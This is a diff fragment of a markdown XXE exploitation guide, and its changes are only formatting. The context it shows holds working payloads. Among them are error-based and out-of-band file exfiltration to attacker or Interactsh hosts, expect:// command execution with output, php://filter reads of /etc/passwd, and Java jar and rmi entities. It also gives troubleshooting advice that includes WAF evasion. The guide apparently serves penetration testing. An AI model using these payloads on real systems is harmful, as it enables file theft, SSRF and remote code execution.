+1. **Use Parameter Entities for Injection**
 
 - Always use **parameter entities** (`%`) for overriding and chaining.
 
-6. **Error-Based Exfiltration Logic**
+1. **Error-Based Exfiltration Logic**
 
 - Reference a non-existent file concatenated with the target file content.
 - Example:
@@ -1288,7 +1298,7 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 ```
 
-7. **Compatibility with Target DTD**
+1. **Compatibility with Target DTD**
 
 - The chosen local DTD must allow parameter entity overrides.
 - Common candidates: `fonts.dtd`, `docbook.dtd`, `jspxml.dtd`
@@ -1315,7 +1325,7 @@ Monitor DNS queries on `attacker.com` to capture data. Tools like `dnsdumpster` 
 
 ## PHP Wrappers
 
-PHP's XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.
+PHP’s XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.
 
 ### expect:// Wrapper (Environment-Specific RCE)
 
@@ -1330,6 +1340,7 @@ The `expect://` wrapper executes system commands through PHP. This is one of the
 ```
 
 Output:
+
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1357,6 +1368,7 @@ The `php://filter` wrapper reads files with encoding filters. Useful for files t
 ```
 
 Output:
+
 ```
 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo...
 ```
@@ -1392,7 +1404,7 @@ Other available filters:
 
 ## Java Protocol Exploitation
 
-Java's XML parsers support additional protocols. These only apply when the target runs Java.
+Java’s XML parsers support additional protocols. These only apply when the target runs Java.
 
 ### jar:// Protocol (Environment-Specific Escalation)
 
@@ -1430,39 +1442,39 @@ RMI example:
 <!ENTITY xxe SYSTEM "rmi://internal-server:1099/object_name">
 ```
 
----
+-----
 
 # Troubleshooting Guide
 
-| Symptom | Likely Cause | Solution |
-|---------|--------------|----------|
-| "Malformed XML" error | XML syntax error in payload | Validate payload syntax; use XML validators |
-| "Unknown protocol: X" | Typo in protocol name | Use valid protocols: `file://`, `http://`, `ftp://` |
-| No entity expansion in output | Entity expansion disabled | Try XInclude or wrapper techniques |
-| No callback received from OOB | Firewall blocking outbound | Use DNS-based OOB; test from DMZ if possible |
-| File contents show only first line | Binary/special characters | Use CDATA or error-based exfiltration |
-| DOCTYPE not allowed error | DOCTYPE explicitly disabled | Use XInclude or file upload techniques |
-| Entity limit exceeded | Billion Laughs protection active | Use single entity; avoid recursive expansion |
-| 403/500 on OOB callback | WAF blocking the request | Obfuscate URL; use different protocols |
-| Parameter entities not expanding | Parser doesn't support them | Use general entities; try XInclude |
-| "Connection refused" on SSRF | Target port not open | Verify port; check firewall |
-| Base64 decoding shows garbage | Filter chain incorrect | Test php://filter chains individually |
-| No error message feedback | Application suppresses errors | Use blind XXE with OOB exfiltration |
+|Symptom                           |Likely Cause                    |Solution                                           |
+|----------------------------------|--------------------------------|---------------------------------------------------|
+|“Malformed XML” error             |XML syntax error in payload     |Validate payload syntax; use XML validators        |
+|“Unknown protocol: X”             |Typo in protocol name           |Use valid protocols: `file://`, `http://`, `ftp://`|
+|No entity expansion in output     |Entity expansion disabled       |Try XInclude or wrapper techniques                 |
+|No callback received from OOB     |Firewall blocking outbound      |Use DNS-based OOB; test from DMZ if possible       |
+|File contents show only first line|Binary/special characters       |Use CDATA or error-based exfiltration              |
+|DOCTYPE not allowed error         |DOCTYPE explicitly disabled     |Use XInclude or file upload techniques             |
+|Entity limit exceeded             |Billion Laughs protection active|Use single entity; avoid recursive expansion       |
+|403/500 on OOB callback           |WAF blocking the request        |Obfuscate URL; use different protocols             |
+|Parameter entities not expanding  |Parser doesn’t support them     |Use general entities; try XInclude                 |
+|“Connection refused” on SSRF      |Target port not open            |Verify port; check firewall                        |
+|Base64 decoding shows garbage     |Filter chain incorrect          |Test php://filter chains individually              |
+|No error message feedback         |Application suppresses errors   |Use blind XXE with OOB exfiltration                |
 
----
+-----
 
 # Tools and Resources
 
 ## Security Testing Tools
 
-| Tool | Purpose | Usage |
-|------|---------|-------|
-| **XXEinjector** | Automated XXE payload generation | `./xxeinjector.py -u http://target.com -f file` |
-| **oxml_xxe** | XXE in Office documents (DOCX, XLSX) | `python oxml_xxe.py generate -t xlsx` |
-| **Burp Suite Collaborator** | OOB XXE detection and exfiltration | Built-in to Burp Suite Pro |
-| **Interactsh** | Free OOB interaction logging (DNS, HTTP) | `./interactsh-client` |
-| **PayloadsAllTheThings** | XXE payload repository | https://github.com/swisskyrepo/PayloadsAllTheThings |
-| **CyberChef** | Payload encoding/transformation | https://cyberchef.io/ |
+|Tool                       |Purpose                                 |Usage                                              |
+|---------------------------|----------------------------------------|---------------------------------------------------|
+|**XXEinjector**            |Automated XXE payload generation        |`./xxeinjector.py -u http://target.com -f file`    |
+|**oxml_xxe**               |XXE in Office documents (DOCX, XLSX)    |`python oxml_xxe.py generate -t xlsx`              |
+|**Burp Suite Collaborator**|OOB XXE detection and exfiltration      |Built-in to Burp Suite Pro                         |
+|**Interactsh**             |Free OOB interaction logging (DNS, HTTP)|`./interactsh-client`                              |
+|**PayloadsAllTheThings**   |XXE payload repository                  |https://github.com/swisskyrepo/PayloadsAllTheThings|
+|**CyberChef**              |Payload encoding/transformation         |https://cyberchef.io/                              |
 
 ### XXEinjector
 
@@ -1490,7 +1502,7 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 # Use the generated domain in XXE payloads: http://<YOUR_INTERACTSH_DOMAIN>/?data=%file;
 ```
 
----
+-----
 
 # References
 
